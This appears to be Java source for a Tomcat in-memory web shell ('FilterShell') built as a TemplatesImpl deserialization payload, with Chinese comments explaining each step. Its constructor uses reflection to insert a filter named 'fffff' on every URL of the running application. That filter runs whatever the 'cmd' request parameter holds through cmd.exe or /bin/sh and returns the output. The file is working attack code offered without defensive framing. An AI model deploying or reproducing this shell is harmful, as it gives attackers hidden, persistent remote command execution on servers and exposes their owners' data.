package cn.org.unk.memshell.tomcat;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.catalina.webresources.StandardRoot;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import sun.reflect.ReflectionFactory;
import javax.servlet.*;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Scanner;

public class FilterShell extends AbstractTranslet implements Filter {

    public static <T> T createWithConstructor(Class<T> classToInstantiate, Class<? super T> constructorClass, Class<?>[] consArgTypes, Object[] consArgs) throws Exception {
        Constructor<? super T> objCons = constructorClass.getDeclaredConstructor(consArgTypes);
        objCons.setAccessible(true);
        Constructor<?> sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);
        sc.setAccessible(true);
        return (T) sc.newInstance(consArgs);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static Object getFieldValue(Object obj,String fieldname) throws Exception{
        Field field = getField(obj.getClass(), fieldname);
        Object o = field.get(obj);
        return o;
    }
    public FilterShell() throws Exception {

        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
        StandardRoot resources = (StandardRoot) getFieldValue(webappClassLoaderBase, "resources");
        StandardContext context = (StandardContext) resources.getContext();

        String filterName = "fffff";

        //构造FilterMap
        FilterMap filterMap = new FilterMap();
        filterMap.setFilterName(filterName);
        filterMap.addURLPattern("/*");

        //构造FilterDef
        FilterDef filterDef = new FilterDef();
        filterDef.setFilterName(filterName);
        filterDef.setFilter(this);

        //通过反射机制获取构造器，然后创建对象
        ApplicationFilterConfig applicationFilterConfig = createWithConstructor(
                ApplicationFilterConfig.class, ApplicationFilterConfig.class,
                //形参类型
                new Class[]{Context.class, FilterDef.class},
                //实参
                new Object[]{context, filterDef}
        );

        //获取到context里的filterConfigs，然后将applicationFilterConfig加入
        HashMap<String, ApplicationFilterConfig> filterConfigs = (HashMap<String, ApplicationFilterConfig> )getFieldValue(context, "filterConfigs");
        filterConfigs.put(filterName,applicationFilterConfig);

        context.addFilterDef(filterDef);
        context.addFilterMap(filterMap);

    }
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        try {
            String arg0 = request.getParameter("cmd");
            if (arg0 != null) {
                PrintWriter writer = response.getWriter();
                String o = "";
                ProcessBuilder p;
                if (System.getProperty("os.name").toLowerCase().contains("win")) {
                    p = new ProcessBuilder(new String[]{"cmd.exe", "/c", arg0});
                } else {
                    p = new ProcessBuilder(new String[]{"/bin/sh", "-c", arg0});
                }

                Scanner c = (new Scanner(p.start().getInputStream())).useDelimiter("\\A");
                o = c.hasNext() ? c.next() : o;
                c.close();
                writer.write(o);
                writer.flush();
                writer.close();
            } else {
                chain.doFilter(request,response);
            }
        } catch (Exception var8) {
        }
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void destroy() {

    }
}
